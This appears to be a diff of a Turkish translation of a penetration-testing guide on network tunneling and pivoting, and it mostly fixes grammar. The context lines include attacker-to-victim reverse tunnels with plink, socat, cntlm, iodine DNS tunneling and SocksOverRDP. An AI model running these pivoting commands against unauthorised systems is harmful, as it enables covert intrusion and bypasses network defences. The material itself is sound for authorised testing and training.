@@ -5,7 +5,7 @@
 ## Nmap ipucu
 
 > [!WARNING]
-> **ICMP** ve **SYN** taramaları socks proxy'leri üzerinden tünellenemez, bu nedenle **ping keşfini devre dışı bırakmalıyız** (`-Pn`) ve bunun çalışması için **TCP taramalarını** (`-sT`) belirtmeliyiz.
+> **ICMP** ve **SYN** taramaları socks proxy'leri üzerinden tünellenemez, bu nedenle **ping keşfini devre dışı bırakmalıyız** (`-Pn`) ve bunun çalışması için **TCP taramaları** (`-sT`) belirtmeliyiz.
 
 ## **Bash**
 
@@ -89,12 +89,12 @@ route add -net 10.0.0.0/16 gw 1.1.1.1
 ```
 > [!NOTE]
 > **Güvenlik – Terrapin Saldırısı (CVE-2023-48795)**
-> 2023 Terrapin geri alma saldırısı, bir adam-arada saldırganın erken SSH el sıkışmasını bozmasına ve **herhangi bir yönlendirilmiş kanala** ( `-L`, `-R`, `-D` ) veri enjekte etmesine olanak tanıyabilir. Hem istemcinin hem de sunucunun yamanmış olduğundan emin olun (**OpenSSH ≥ 9.6/LibreSSH 6.7**) veya SSH tünellerine güvenmeden önce savunmasız `chacha20-poly1305@openssh.com` ve `*-etm@openssh.com` algoritmalarını `sshd_config`/`ssh_config` içinde açıkça devre dışı bırakın.
+> 2023 Terrapin geri alma saldırısı, bir adam-arada saldırganın erken SSH el sıkışmasını bozmasına ve **herhangi bir yönlendirilmiş kanala** veri enjekte etmesine olanak tanıyabilir ( `-L`, `-R`, `-D` ). Hem istemcinin hem de sunucunun yamanmış olduğundan emin olun (**OpenSSH ≥ 9.6/LibreSSH 6.7**) veya SSH tünellerine güvenmeden önce savunmasız `chacha20-poly1305@openssh.com` ve `*-etm@openssh.com` algoritmalarını `sshd_config`/`ssh_config` içinde açıkça devre dışı bırakın.
 
 ## SSHUTTLE
 
 Bir ana bilgisayar üzerinden **ssh** ile tüm **trafik**i bir **alt ağa** **tünelleme** yapabilirsiniz.\
-Örneğin, 10.10.10.0/24 adresine giden tüm trafiği yönlendirmek
+Örneğin, 10.10.10.0/24 adresine giden tüm trafiği yönlendirmek.
 ```bash
 pip install sshuttle
 sshuttle -r user@host 10.10.10.10/24
@@ -300,7 +300,7 @@ OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|PROXY:hacke
 
 **/bin/sh konsolu**
 
-Her iki tarafta da: İstemci ve Sunucu için sertifikalar oluşturun
+Her iki tarafta da: İstemci ve Sunucu için sertifikalar oluşturun.
 ```bash
 # Execute these commands on both sides
 FILENAME=socatssl
@@ -324,9 +324,9 @@ attacker> ssh localhost -p 2222 -l www-data -i vulnerable #Connects to the ssh o
 ```
 ## Plink.exe
 
-Konsol PuTTY versiyonu gibidir (seçenekler bir ssh istemcisine çok benzer).
+Konsol PuTTY versiyonuna benzer (seçenekler bir ssh istemcisine çok benzer).
 
-Bu ikili dosya kurban üzerinde çalıştırılacağından ve bir ssh istemcisi olduğundan, ters bağlantı kurabilmemiz için ssh hizmetimizi ve portumuzu açmamız gerekiyor. Ardından, yalnızca yerel olarak erişilebilir bir portu makinemizdeki bir porta yönlendirmek için:
+Bu ikili dosya kurban üzerinde çalıştırılacağı için ve bir ssh istemcisi olduğu için, ters bağlantı kurabilmemiz için ssh hizmetimizi ve portumuzu açmamız gerekiyor. Ardından, yalnızca yerel olarak erişilebilir bir portu makinemizdeki bir porta yönlendirmek için:
 ```bash
 echo y | plink.exe -l <Our_valid_username> -pw <valid_password> [-p <port>] -R <port_ in_our_host>:<next_ip>:<final_port> <your_ip>
 echo y | plink.exe -l root -pw password [-p 2222] -R 9090:127.0.0.1:9090 10.11.0.41 #Local port 9090 to out port 9090
@@ -347,7 +347,7 @@ netsh interface portproxy delete v4tov4 listenaddress=0.0.0.0 listenport=4444
 ```
 ## SocksOverRDP & Proxifier
 
-**Sisteme RDP erişiminiz olmalıdır.**\
+Sistemde **RDP erişimine sahip olmalısınız**.\
 İndirin:
 
 1. [SocksOverRDP x64 Binaries](https://github.com/nccgroup/SocksOverRDP/releases) - Bu araç, Windows'un Uzak Masaüstü Servisi özelliğinden `Dynamic Virtual Channels` (`DVC`) kullanır. DVC, **RDP bağlantısı üzerinden paketleri tünellemekten** sorumludur.
@@ -358,9 +358,9 @@ netsh interface portproxy delete v4tov4 listenaddress=0.0.0.0 listenport=4444
 # Load SocksOverRDP.dll using regsvr32.exe
 C:\SocksOverRDP-x64> regsvr32.exe SocksOverRDP-Plugin.dll
 ```
-Artık **`mstsc.exe`** kullanarak **RDP** üzerinden **kurban** ile **bağlanabiliriz** ve **SocksOverRDP eklentisinin etkin olduğu** belirten bir **istem** alacağız, bu **127.0.0.1:1080** adresinde **dinleyecektir**.
+Artık **`mstsc.exe`** kullanarak **RDP** üzerinden **kurban** ile **bağlanabiliriz** ve **SocksOverRDP eklentisinin etkin olduğu** belirten bir **istem** alacağız ve bu **127.0.0.1:1080** adresinde **dinleyecektir**.
 
-**RDP** üzerinden **bağlanın** ve kurban makinesine `SocksOverRDP-Server.exe` ikili dosyasını yükleyip çalıştırın:
+**RDP** üzerinden **bağlanın** ve kurban makinesine `SocksOverRDP-Server.exe` ikilisini yükleyip çalıştırın:
 ```
 C:\SocksOverRDP-x64> SocksOverRDP-Server.exe
 ```
@@ -387,7 +387,7 @@ http-proxy <proxy_ip> 8080 <file_with_creds> ntlm
 
 [http://cntlm.sourceforge.net/](http://cntlm.sourceforge.net/)
 
-Bir proxy'ye karşı kimlik doğrulaması yapar ve belirttiğiniz dış hizmete yönlendirilmiş olarak yerel olarak bir port bağlar. Ardından, bu port üzerinden tercih ettiğiniz aracı kullanabilirsiniz.\
+Bir proxy'ye karşı kimlik doğrulaması yapar ve belirttiğiniz dış hizmete yönlendirilmiş yerel bir port bağlar. Ardından, bu port üzerinden tercih ettiğiniz aracı kullanabilirsiniz.\
 Örneğin, 443 portunu yönlendirin.
 ```
 Username Alice
@@ -396,14 +396,14 @@ Domain CONTOSO.COM
 Proxy 10.0.0.10:8080
 Tunnel 2222:<attackers_machine>:443
 ```
-Şimdi, örneğin kurbanın **SSH** hizmetini 443 numaralı portta dinleyecek şekilde ayarlarsanız. Buna saldırganın 2222 numaralı portu üzerinden bağlanabilirsiniz.\
+Şimdi, örneğin kurbanın **SSH** hizmetini 443 numaralı portta dinleyecek şekilde ayarlarsanız. Saldırgan 2222 numaralı port üzerinden buna bağlanabilirsiniz.\
 Ayrıca, localhost:443'e bağlanan bir **meterpreter** kullanabilir ve saldırgan 2222 numaralı portta dinliyor olabilir.
 
 ## YARP
 
 Microsoft tarafından oluşturulmuş bir ters proxy. Bunu burada bulabilirsiniz: [https://github.com/microsoft/reverse-proxy](https://github.com/microsoft/reverse-proxy)
 
-## DNS Tunneling
+## DNS Tünelleme
 
 ### Iodine
 
@@ -415,7 +415,7 @@ attacker> iodined -f -c -P P@ssw0rd 1.1.1.1 tunneldomain.com
 victim> iodine -f -P P@ssw0rd tunneldomain.com -r
 #You can see the victim at 1.1.1.2
 ```
-Tünel çok yavaş olacak. Bu tünel üzerinden sıkıştırılmış bir SSH bağlantısı oluşturmak için şunu kullanabilirsiniz:
+Tünel çok yavaş olacaktır. Bu tünel üzerinden sıkıştırılmış bir SSH bağlantısı oluşturmak için şunu kullanabilirsiniz:
 ```
 ssh <user>@1.1.1.2 -C -c blowfish-cbc,arcfour -o CompressionLevel=9 -D 1080
 ```
@@ -483,7 +483,7 @@ ssh -D 9050 -p 2222 -l user 127.0.0.1
 ```
 ## ngrok
 
-[**ngrok**](https://ngrok.com/) **bir komut satırı ile çözümleri internete açmak için bir araçtır.**\
+[**ngrok**](https://ngrok.com/) **bir komut satırı ile çözümleri İnternete açmak için bir araçtır.**\
 _Exposition URI şöyle görünür:_ **UID.ngrok.io**
 
 ### Kurulum
@@ -547,7 +547,7 @@ addr: file:///tmp/httpbin/
 ```
 ## Cloudflared (Cloudflare Tüneli)
 
-Cloudflare’ın `cloudflared` daemon'u, **yerel TCP/UDP hizmetlerini** dışa açan tüneller oluşturabilir ve bu, Cloudflare’ın kenarını buluşma noktası olarak kullanarak, gelen güvenlik duvarı kurallarına ihtiyaç duymadan yapılır. Bu, çıkış güvenlik duvarının yalnızca HTTPS trafiğine izin verdiği ancak gelen bağlantıların engellendiği durumlarda oldukça kullanışlıdır.
+Cloudflare’ın `cloudflared` daemon'u, **yerel TCP/UDP hizmetlerini** dışa açan tüneller oluşturabilir; bu, Cloudflare’ın kenarını buluşma noktası olarak kullanarak, gelen güvenlik duvarı kurallarına ihtiyaç duymadan yapılır. Bu, çıkış güvenlik duvarının yalnızca HTTPS trafiğine izin verdiği ancak gelen bağlantıların engellendiği durumlarda oldukça kullanışlıdır.
 
 ### Hızlı tünel tek satır komutu
 ```bash
